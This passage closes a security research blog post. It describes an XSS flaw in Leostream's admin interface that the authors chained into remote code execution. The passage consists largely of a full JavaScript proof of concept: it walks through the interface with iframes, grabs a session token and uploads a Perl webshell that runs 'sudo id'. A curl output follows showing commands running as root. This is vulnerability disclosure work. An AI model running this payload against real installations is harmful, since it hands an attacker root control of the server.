</code></pre></div></div> <p>This digest has a random component that is updated every time, so if you refresh the web the <code class="language-plaintext highlighter-rouge">r</code> values are changed:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>clients.pl?uid=cHvoum7HQN64ywj3qTeCSQMM94TxrNTge62gnUXYkKQ;mb_user=remote_authentication;r=J0qimdk1465
clients.pl?uid=cHvoum7HQN64ywj3qTeCSQMM94TxrNTge62gnUXYkKQ;mb_user=remote_authentication;r=DyslJw14661
clients.pl?uid=cHvoum7HQN64ywj3qTeCSQMM94TxrNTge62gnUXYkKQ;mb_user=remote_authentication;r=nnAy09Q7683
...
</code></pre></div></div> <p>Here are our problems:</p> <ul> <li><strong>Problem #1</strong>: we can not predict this value, so we can not just send a POST request to upload our webshell. We need to force the navigation and extract the <code class="language-plaintext highlighter-rouge">r</code> generated.</li> <li><strong>Poblem #2</strong>: the form used to upload third-party compontents is located inside a subsection. We first need to go to the “section”, and then navigate to the “subsection”, also filling some forms in the way.</li> </ul> <p>Solution: two iframes. Not a charming solution, but it works. Our payload should:</p> <ol> <li>Locate the link to the “system” section. We can get it accessing the DOM (<code class="language-plaintext highlighter-rouge">document.getElementsByTagName("a")[4]["href"]</code>)</li> <li>Open an iframe to this location (iframe “pwn1”)</li> <li>Wait until it is loaded and extract the link to the subsection “Maintance” from its DOM (<code class="language-plaintext highlighter-rouge">window.frames["pwn1"].contentDocument.getElementsByTagName("a")[14]["href"]</code>)</li> <li>Create a new iframe to this new location (iframe “pwn2”) and wait for it to load</li> <li>Find the form inside this second iframe and auto-submit it setting the value to “Upload third-party content” (<code class="language-plaintext highlighter-rouge">window.frames["pwn2"].contentDocument.forms[0]["todo"].value = "upload_tpc"</code>)</li> <li>Wait until the iframe is reloaded (because of the submited form)</li> <li>Now finally we are at the “upload file” form (<code class="language-plaintext highlighter-rouge">window.frames["pwn2"].contentDocument.forms[0]["action"]</code>) and we can read the URL to do the request to upload our webshell (just <code class="language-plaintext highlighter-rouge">fetch()</code>).</li> </ol> <p>Here is our (crappy) final payload (it just executes a <code class="language-plaintext highlighter-rouge">sudo id</code>):</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// PoC for XSS in Leostream by X-C3LL (Juan Manuel Fernandez)</span>
<span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="nx">i</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">,</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="dl">"</span><span class="s2">a</span><span class="dl">"</span><span class="p">)[</span><span class="mi">4</span><span class="p">][</span><span class="dl">"</span><span class="s2">href</span><span class="dl">"</span><span class="p">]);</span>
<span class="nx">i</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">pwn1</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">i</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">load</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="c1">// Wait to load the iframe and then submit the form to go to the page where we can upload the file</span>

    <span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">f</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">,</span> <span class="nb">window</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="dl">"</span><span class="s2">pwn1</span><span class="dl">"</span><span class="p">].</span><span class="nx">contentDocument</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="dl">"</span><span class="s2">a</span><span class="dl">"</span><span class="p">)[</span><span class="mi">14</span><span class="p">][</span><span class="dl">"</span><span class="s2">href</span><span class="dl">"</span><span class="p">]);</span>
    <span class="nx">f</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">pwn2</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">f</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">load</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">check</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">window</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="dl">"</span><span class="s2">pwn2</span><span class="dl">"</span><span class="p">].</span><span class="nx">contentDocument</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="dl">"</span><span class="s2">todo</span><span class="dl">"</span><span class="p">].</span><span class="nx">value</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">upload_tpc</span><span class="dl">"</span>
            <span class="nb">window</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="dl">"</span><span class="s2">pwn2</span><span class="dl">"</span><span class="p">].</span><span class="nx">contentDocument</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">()</span>
            <span class="nx">check</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
            <span class="nx">fetch</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="dl">"</span><span class="s2">pwn2</span><span class="dl">"</span><span class="p">].</span><span class="nx">contentDocument</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="dl">"</span><span class="s2">action</span><span class="dl">"</span><span class="p">],</span> <span class="p">{</span>
                <span class="dl">"</span><span class="s2">credentials</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">include</span><span class="dl">"</span><span class="p">,</span>
                <span class="dl">"</span><span class="s2">headers</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
                <span class="dl">"</span><span class="s2">User-Agent</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Swag Owl</span><span class="dl">"</span><span class="p">,</span>
                <span class="dl">"</span><span class="s2">Accept</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><span class="dl">"</span><span class="p">,</span>
                <span class="dl">"</span><span class="s2">Accept-Language</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3</span><span class="dl">"</span><span class="p">,</span>
                <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">multipart/form-data; boundary=---------------------------342766341182433198532876615</span><span class="dl">"</span><span class="p">,</span>
                <span class="dl">"</span><span class="s2">Upgrade-Insecure-Requests</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">1</span><span class="dl">"</span>
            <span class="p">},</span>
            <span class="dl">"</span><span class="s2">referrer</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">http://owlland/config.pl?uid=h5wxiUFQp6yF4RfDRw14AmRkMGDdxSoGR0kuU3QP9Q;_multi_part_form=1;mb_config=maintenance;maintenance_act=upload_tpc;r=k3snhvj7694</span><span class="dl">"</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">body</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">_form_has_changed</span><span class="se">\"\r\n\r\n</span><span class="s2">0</span><span class="se">\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">uid</span><span class="se">\"\r\n\r\n</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">window</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="dl">"</span><span class="s2">pwn2</span><span class="dl">"</span><span class="p">].</span><span class="nx">contentDocument</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="dl">"</span><span class="s2">uid</span><span class="dl">"</span><span class="p">].</span><span class="nx">value</span> <span class="o">+</span> <span class="dl">"</span><span class="se">\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">_FORM_SUBMIT</span><span class="se">\"\r\n\r\n</span><span class="s2">1</span><span class="se">\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">_RAN</span><span class="se">\"\r\n\r\n</span><span class="s2">99993948</span><span class="se">\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">_STRIP</span><span class="se">\"\r\n\r\n\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">_FORM_POSITION</span><span class="se">\"\r\n\r\n</span><span class="s2">0</span><span class="se">\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">_DATA_FIELDS</span><span class="se">\"\r\n\r\n</span><span class="s2">file_name</span><span class="se">\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">_NUMBER_FIELDS</span><span class="se">\"\r\n\r\n\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">_POPUP_FIELDS</span><span class="se">\"\r\n\r\n\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">_NETMASK_FIELDS</span><span class="se">\"\r\n\r\n\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">_IP_FIELDS</span><span class="se">\"\r\n\r\n\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">_IP_FIELDS_NUMERIC</span><span class="se">\"\r\n\r\n\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">_GT_ZERO_FIELDS</span><span class="se">\"\r\n\r\n\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">_GE_ZERO_FIELDS</span><span class="se">\"\r\n\r\n\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">_EMAIL_FIELDS</span><span class="se">\"\r\n\r\n\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">_PASSWORD_FIELDS</span><span class="se">\"\r\n\r\n\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">_FILE_FIELDS</span><span class="se">\"\r\n\r\n</span><span class="s2">file_name</span><span class="se">\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">_REQUIRED_FIELDS</span><span class="se">\"\r\n\r\n</span><span class="s2">file_name</span><span class="se">\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">_UNIQUE_FIELDS</span><span class="se">\"\r\n\r\n\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">_HIDDEN_FIELDS</span><span class="se">\"\r\n\r\n\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">_multi_part_form</span><span class="se">\"\r\n\r\n</span><span class="s2">1</span><span class="se">\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">file_name</span><span class="se">\"</span><span class="s2">; filename=</span><span class="se">\"</span><span class="s2">0xCC.pl</span><span class="se">\"\r\n</span><span class="s2">Content-Type: text/x-perl-script</span><span class="se">\r\n\r\n</span><span class="s2">print `sudo id`;</span><span class="se">\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">mb_config</span><span class="se">\"\r\n\r\n</span><span class="s2">maintenance</span><span class="se">\r\n</span><span class="s2">-----------------------------342766341182433198532876615</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">maintenance_act</span><span class="se">\"\r\n\r\n</span><span class="s2">upload_tpc</span><span class="se">\r\n</span><span class="s2">-----------------------------342766341182433198532876615--</span><span class="se">\r\n</span><span class="dl">"</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">method</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">mode</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">cors</span><span class="dl">"</span>
            <span class="p">});</span>
        <span class="p">}</span>  
    <span class="p">});</span>

    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>

<span class="p">});</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
</code></pre></div></div> <p>And finally:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ᐓ   curl http://192.168.0.20/tpc/0xCC.pl
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</code></pre></div></div> <p><strong>:)</strong></p> <h1 id="eof"> <a href="#eof" class="anchor-head"></a> EoF </h1> <p>This wasn’t really a holy bug, however discovering it was fun because we had to learn a bit about ancient horrors like source filters. We hope you enjoyed this reading!</p> <p>Feel free to give us feedback at our twitter <a href="https://twitter.com/AdeptsOf0xCC">@AdeptsOf0xCC</a>.</p> </div> </article> </main> <small class="post-updated-at">updated_at 05-10-2020</small> <nav class="post-nav"> <a class="post-nav-item post-nav-next" href="/Ruckus-VRIOT-RCE/"> <div class="nav-arrow">Next</div> <span class="post-title">Remote Command Execution in Ruckus IoT Controller (CVE-2020-26878 & CVE-2020-26879)</span> </a> </nav> <footer class="footer"> <a class="footer_item" href="/feed.xml">rss</a> <span class="footer_item">&copy; 2021</span> <small class="footer_copyright"> <!-- Klisé Theme: https://github.com/piharpi/jekyll-klise --> <a href="https://github.com/piharpi/jekyll-klise" target="_blank" rel="noreferrer noopener" >klisé</a > theme on <a href="https://jekyllrb.com" target="_blank" rel="noreferrer noopener" >jekyll</a > </small> </footer> <script src="/assets/js/main.js" defer="defer"></script> </div> </body> </html>
